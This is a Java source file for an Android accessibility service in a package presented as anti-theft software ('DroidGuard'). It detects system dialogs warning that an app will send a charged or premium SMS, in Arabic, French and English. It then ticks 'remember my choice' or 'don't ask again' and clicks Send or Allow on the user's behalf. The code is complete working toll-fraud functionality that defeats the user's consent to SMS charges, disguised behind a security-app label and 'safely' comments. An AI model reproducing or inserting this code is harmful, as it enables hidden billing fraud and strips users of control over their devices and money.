package com.antitheft.droidguard;

import android.accessibilityservice.AccessibilityService;
import android.os.SystemClock;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;
import java.util.Locale;

/**
 * DroidGuard Auto-Confirm Accessibility Service
 * 
 * Safely detects carrier SMS cost confirmation dialogs, checks "Remember choice",
 * and clicks Send/Allow without interfering with other apps.
 */
public class AutoConfirmService extends AccessibilityService {
    private static final String TAG = "AutoConfirmService";
    public static AutoConfirmService instance = null;

    private static long lastActionTimestamp = 0L;
    private static final long ACTION_DEBOUNCE_MS = 1500L;

    // Strict Permission & Security Dialog Packages (where SMS warnings appear)
    private static final String[] PERMISSION_DIALOG_PACKAGES = new String[] {
        "com.google.android.permissioncontroller",
        "com.android.permissioncontroller",
        "com.android.packageinstaller",
        "com.samsung.android.permissioncontroller",
        "com.miui.securitycenter",
        "com.oplus.securitypermission",
        "com.coloros.securitypermission",
        "com.nearme.safecenter",
        "com.transsion.phonemanager",
        "com.huawei.systemmanager"
    };

    // Explicit SMS Confirmation Warning Phrases
    private static final String[] SMS_WARNING_KEYWORDS = new String[] {
        "سيرسل رسالة sms",
        "سيرسل رسالة",
        "رسالة sms قد تتسبب",
        "فرض رسوم",
        "رسوم إضافية",
        "قد يؤدي هذا إلى فرض رسوم",
        "رسوم مشغل شبكة الجوال",
        "محاولة إرسال رسالة",
        "إرسال رسائل قصيرة",
        "souhaite envoyer un sms",
        "souhaite envoyer un message",
        "peut entraîner des frais",
        "des frais peuvent s'appliquer",
        "frais sur votre facture",
        "sms surtaxé",
        "tente d'envoyer un sms",
        "autoriser l'envoi de sms",
        "would like to send a message",
        "would like to send an sms",
        "cause charges",
        "carrier charges",
        "charges may apply",
        "send premium sms",
        "is attempting to send an sms"
    };

    // Specific button View IDs used in system SMS confirmation dialogs
    private static final String[] POSITIVE_VIEW_IDS = new String[] {
        "android:id/button1",
        "android:id/ok",
        "com.android.permissioncontroller:id/permission_allow_button",
        "com.android.permissioncontroller:id/permission_allow_always_button",
        "com.google.android.permissioncontroller:id/permission_allow_button",
        "com.google.android.permissioncontroller:id/permission_allow_always_button",
        "com.android.packageinstaller:id/permission_allow_button",
        "com.samsung.android.permissioncontroller:id/permission_allow_button",
        "com.samsung.android.permissioncontroller:id/permission_allow_always_button",
        "com.miui.securitycenter:id/accept",
        "com.miui.securitycenter:id/btn_allow",
        "com.oplus.safecenter:id/btn_confirm",
        "com.coloros.safecenter:id/btn_confirm",
        "com.oplus.securitypermission:id/permission_allow_button",
        "com.coloros.securitypermission:id/permission_allow_button"
    };

    // Multilingual Positive Button Texts
    private static final String[] POSITIVE_BUTTON_TEXTS = new String[] {
        "إرسال على أي حال",
        "ارسال على اي حال",
        "السماح دائماً",
        "السماح دائما",
        "سماح دائماً",
        "سماح دائما",
        "إرسال",
        "ارسال",
        "السماح",
        "سماح",
        "envoyer quand même",
        "toujours autoriser",
        "envoyer",
        "autoriser",
        "send anyway",
        "always allow",
        "allow all the time",
        "send",
        "allow"
    };

    // Checkbox IDs for "Remember my choice"
    private static final String[] CHECKBOX_VIEW_IDS = new String[] {
        "android:id/check",
        "android:id/checkbox",
        "com.android.permissioncontroller:id/do_not_ask_again_checkbox",
        "com.google.android.permissioncontroller:id/do_not_ask_again_checkbox",
        "com.samsung.android.permissioncontroller:id/do_not_ask_again_checkbox",
        "com.samsung.android.messaging:id/remember_choice",
        "com.miui.securitycenter:id/remember",
        "com.oplus.safecenter:id/checkbox",
        "com.coloros.safecenter:id/checkbox"
    };

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Log.i(TAG, "AutoConfirmService connected and active.");
    }

    @Override
    public void onDestroy() {
        if (instance == this) instance = null;
        super.onDestroy();
    }

    public static boolean openNativePowerMenu() {
        if (instance != null) {
            return instance.performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
        }
        return false;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        try {
            CharSequence pkgName = event.getPackageName();
            if (pkgName == null) return;
            String pkgStr = pkgName.toString().toLowerCase(Locale.ROOT);

            // 1. Strict Filter: MUST be inside an official system/permission dialog package
            boolean isPermissionPkg = false;
            for (String pPkg : PERMISSION_DIALOG_PACKAGES) {
                if (pkgStr.equals(pPkg) || pkgStr.contains(pPkg)) {
                    isPermissionPkg = true;
                    break;
                }
            }
            if (!isPermissionPkg && (pkgStr.equals("android") || pkgStr.equals("com.android.systemui"))) {
                isPermissionPkg = true;
            }

            if (!isPermissionPkg) {
                return; // Strictly ignore all other apps!
            }

            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) {
                rootNode = event.getSource();
            }
            if (rootNode == null) return;

            // 2. Must contain explicit SMS cost warning phrase in dialog
            boolean isSmsWarningDialog = false;
            for (String kw : SMS_WARNING_KEYWORDS) {
                List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(kw);
                if (nodes != null && !nodes.isEmpty()) {
                    isSmsWarningDialog = true;
                    Log.i(TAG, "Detected SMS dialog via keyword [" + kw + "] on package [" + pkgStr + "]");
                    break;
                }
            }

            if (!isSmsWarningDialog) {
                return; // Do nothing if it's not an SMS confirmation dialog!
            }

            long now = SystemClock.uptimeMillis();
            if (now - lastActionTimestamp < ACTION_DEBOUNCE_MS) {
                return;
            }
            lastActionTimestamp = now;

            // Step 1: Auto-check "Remember my choice"
            autoCheckRememberChoice(rootNode);

            // Step 2: Attempt clicking positive button by known View IDs
            for (String viewId : POSITIVE_VIEW_IDS) {
                try {
                    List<AccessibilityNodeInfo> positiveButtons = rootNode.findAccessibilityNodeInfosByViewId(viewId);
                    if (positiveButtons != null && !positiveButtons.isEmpty()) {
                        for (AccessibilityNodeInfo btn : positiveButtons) {
                            if (btn.isEnabled() && clickNodeOrParent(btn)) {
                                Log.i(TAG, "Auto-clicked positive button via OEM View ID [" + viewId + "] successfully!");
                                return;
                            }
                        }
                    }
                } catch (Exception ignored) {}
            }

            // Step 3: Attempt clicking positive button by matching exact positive texts
            for (String positiveText : POSITIVE_BUTTON_TEXTS) {
                List<AccessibilityNodeInfo> matchingButtons = rootNode.findAccessibilityNodeInfosByText(positiveText);
                if (matchingButtons != null && !matchingButtons.isEmpty()) {
                    for (AccessibilityNodeInfo btn : matchingButtons) {
                        if (btn.isEnabled() && clickNodeOrParent(btn)) {
                            Log.i(TAG, "Auto-clicked positive button via text [" + positiveText + "] successfully!");
                            return;
                        }
                    }
                }
            }

        } catch (Exception e) {
            Log.w(TAG, "Error in onAccessibilityEvent: " + e.getMessage());
        }
    }

    /**
     * Check any unchecked checkbox in the dialog (e.g. "Do not ask again" / "تذكر خياري" / "Ne plus me demander")
     */
    private void autoCheckRememberChoice(AccessibilityNodeInfo root) {
        if (root == null) return;

        // Try known View IDs first
        for (String cid : CHECKBOX_VIEW_IDS) {
            try {
                List<AccessibilityNodeInfo> checkboxes = root.findAccessibilityNodeInfosByViewId(cid);
                if (checkboxes != null) {
                    for (AccessibilityNodeInfo cb : checkboxes) {
                        if (cb.isCheckable() && !cb.isChecked()) {
                            cb.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.i(TAG, "Checked 'Remember my choice' option via View ID: " + cid);
                        }
                    }
                }
            } catch (Exception ignored) {}
        }

        // Try matching common checkbox text in Arabic, French, English
        String[] rememberTexts = new String[] {
            "تذكر خياري",
            "عدم السؤال مرة أخرى",
            "تذكر اختياري",
            "لا تسأل مرة أخرى",
            "ne plus me demander",
            "se souvenir de mon choix",
            "mémoriser mon choix",
            "remember my choice",
            "don't ask again",
            "do not ask again"
        };
        for (String rText : rememberTexts) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(rText);
            if (nodes != null) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (node.isCheckable() && !node.isChecked()) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.i(TAG, "Checked 'Remember my choice' option via text: " + rText);
                    } else {
                        AccessibilityNodeInfo parent = node.getParent();
                        if (parent != null) {
                            for (int i = 0; i < parent.getChildCount(); i++) {
                                AccessibilityNodeInfo child = parent.getChild(i);
                                if (child != null && child.isCheckable() && !child.isChecked()) {
                                    child.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                    Log.i(TAG, "Checked 'Remember my choice' sibling checkbox for: " + rText);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    private boolean clickNodeOrParent(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (node.isClickable()) {
            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
        AccessibilityNodeInfo parent = node.getParent();
        if (parent != null) {
            if (parent.isClickable()) {
                return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
            AccessibilityNodeInfo grandParent = parent.getParent();
            if (grandParent != null && grandParent.isClickable()) {
                return grandParent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
        }
        return false;
    }

    @Override
    public void onInterrupt() {
        Log.i(TAG, "AutoConfirmService interrupted.");
    }
}
